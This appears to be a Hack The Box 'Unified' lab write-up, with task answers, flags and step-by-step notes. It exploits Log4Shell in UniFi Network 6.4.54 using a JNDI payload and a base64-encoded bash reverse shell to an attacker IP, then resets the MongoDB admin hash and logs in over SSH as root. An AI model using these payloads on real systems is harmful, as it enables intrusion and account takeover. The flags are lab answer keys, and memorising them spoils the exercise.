# Tasks
- Which are the first four open ports?
	- 22,6789,8080,8443
- What is the title of the software that is running running on port 8443?
	- UniFi Network
- What is the version of the software that is running?What is the version of the software that is running?
	- 6.4.54
- What is the CVE for the identified vulnerability?
	- CVE-2021-44228
- What protocol does JNDI leverage in the injection?
	- LDAP
- What tool do we use to intercept the traffic, indicating the attack was successful?
	- tcpdump
- What port do we need to inspect intercepted traffic for?
	- 389
- What port is the MongoDB service running on?
	- 27117
- What is the default database name for UniFi applications?
	- ace
- What is the function we use to enumerate users within the database in MongoDB?
	- db.admin.find()
- What is the function we use to update users within the database in MongoDB?
	- db.admin.update()
- What is the password for the root user?
	- NotACrackablePassword4U2022
- User flag
	- 6ced1a6a89e666c0620cdb10262ba127
- Root flag
	- e50bc93c75b634e4b272d2f771c33681


# Notes
- First, let's go with rustscan
```
rustscan --ulimit 5000 --addresses "10.129.96.149" --top -- -sC -sV
```
- From the results, we see that the first 4 ports at 22, 6789. 8080, and 8443
- We also see that an SSH server is being ran, along with the fact that UniFi Network was also running on this box as well
- Specifically, we can see that version 6.4.54 running
- This is a really specific version, so there might be a CVE attached to it
- In fact, doing a quick search, we see that this version is in fact vulnerable to CVE-2021-44228, or better known as the Log4j exploit
- But first, we need to get through the login screen, so for that, we'll use Burp Suite to help us out
- We are then able to grab the specific packet going towards the /api/login endpoint, which is what we want to manipulate
```
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
Content-Length: 68
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Content-Type: application/json; charset=utf-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: https://10.129.96.149:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.129.96.149:8443/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"username":"test","password":"test","remember":false,"strict":true}
```
- We can mess with the remember field, and do something like this:
```
...
"remember" : "$jndi:ldap://10.10.15.113/whatever)"
...
```
- Obviously this will not really return anything, but the error itself tells us that at least it was accepted as a payload and attempted a run:
```
HTTP/1.1 400 
vary: Origin
Access-Control-Allow-Origin: https://10.129.96.149:8443
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Content-Length: 64
Date: Fri, 02 Jan 2026 02:10:28 GMT
Connection: close

{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}
```
- So, what we can do is put in an interception with something like tcpdump
```
tcpdump -i tun0 port 389
```
- So, we will use the Rouge JDNI program to get our payload onto the box
- First, let's create our payload first, and then run the server
```
[Jan 01, 2026 - 18:26:01 (PST)] exegol-htb-starting-point bin # echo 'bash -c bash -i >&/dev/tcp/10.10.15.113/4444 0>&1' | base64  
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTEzLzQ0NDQgMD4mMQo=  
[Jan 01, 2026 - 18:27:38 (PST)] exegol-htb-starting-point bin # java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTEzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.113"
```
- Now, let's get a listener up and running
```
nc -lvp 4444
```
- Now with that, we can modify our HTTP request to activate our payload:
```
"remember":"${jndi:ldap://10.10.15.113:1389/o=tomcat}",
```
- We can then get our initial shell. Like before, let's super basic:
```
[Jan 01, 2026 - 18:29:29 (PST)] exegol-htb-starting-point /workspace # nc -lvp 4444  
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.96.149.  
Ncat: Connection from 10.129.96.149:44702.  
whoami  
unifi
```
- So, to make it nicer, we can use something like this to upgrade it:
```
script /dev/null -c bash
```
- Now, we are able to get that upgrade:
```
script /dev/null -c bash  
Script started, file is /dev/null  
unifi@unified:/usr/lib/unifi$ whoami  
whoami  
unifi  
unifi@unified:/usr/lib/unifi$
```
- We can now navigate the system to get the user flag
```
unifi@unified:/usr/lib/unifi$ cd /home  
cd /home  
unifi@unified:/home$ ls  
ls  
michael  
unifi@unified:/home$ cd micheal  
cd micheal  
bash: cd: micheal: No such file or directory  
unifi@unified:/home$ cd michael  
cd michael  
unifi@unified:/home/michael$ ls  
ls  
user.txt  
unifi@unified:/home/michael$ cat user.txt  
cat user.txt  
6ced1a6a89e666c0620cdb10262ba127
```
- Now, we are looking for a supposed MongoDB instance, so let's find it:
```
unifi@unified:/home/michael$ ps aux | grep mongo  
ps aux | grep mongo  
unifi         68  0.3  4.1 1100672 84664 ?       Sl   01:46   0:10 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --p  
idfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1  
unifi       1481  0.0  0.0  11468  1072 pts/0    S+   02:35   0:00 grep mongo
```
- We are able to see that one does exist on this box
- So, we can attempt to connect into the database
```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```
- We are able to see that an admin account exists and we are also given the password hash
```
...
"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),                                                                                                                                                                                          
       "name" : "administrator",                                                                                                                                                                                                              
       "email" : "administrator@unified.htb",                                                                                                                                                                                                 
       "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",                                                                                                                     
       "time_created" : NumberLong(1640900495),                                                                                                                                                                                               
       "last_site_name" : "default",
...
```
- We can see that this hash is SHA-512, but the problem is that it's salted, so it's hard to crack
- However, we can instead create our own password, hash that, and then attempt to pass that hash in as a password reset
- So, let's create something easy:
```
[Jan 01, 2026 - 17:26:00 (PST)] exegol-htb-starting-point /workspace # mkpasswd -m sha-512 password                              
$6$uamwV4isXjJMubd7$zlDedlfGq8uMdoPrD1ZPdmLaFWS6Kj3ixD1qpD08RUv3HY5wZ4/dLU4gUW1dhFPQHEWmO3v7Lf9P1TyOGgqjj
```
- Now, we can attempt to pass it in:
```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$uamwV4isXjJMubd7$zlDedlfGq8uMdoPrD1ZPdmLaFWS6Kj3ixD1qpD08RUv3HY5wZ4/dLU4gUW1dhFPQHEWmO3v7Lf9P1TyOGgqjj."}})'
```
- We are able to get the password to be set!
```
"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),                                                                                                                                                                                                                            
       "name" : "administrator",                                                                                                                                                                                                                                                
       "email" : "administrator@unified.htb",                                                                                                                                                                                                                                   
       "x_shadow" : "$6$uamwV4isXjJMubd7$zlDedlfGq8uMdoPrD1ZPdmLaFWS6Kj3ixD1qpD08RUv3HY5wZ4/dLU4gUW1dhFPQHEWmO3v7Lf9P1TyOGgqjj.",
```
 - And with that, we are able to get into the portal
 - An interesting feature of UniFI is that we can do SSH authentication, which is definitely something we can use
 - In fact, going into the settings, we are able to pull out full root credentials. Ouch
	 - root:NotACrackablePassword4U2022
- So, we can ssh into the box as the root user now
```
ssh root@10.129.96.149
```
- And now... we are root!
```
root@unified:~# whoami  
root
```
- We are able to get the root flag from here
```
root@unified:~# cd /root  
root@unified:~# ls  
root.txt  
root@unified:~# cat root.txt  
e50bc93c75b634e4b272d2f771c33681
```
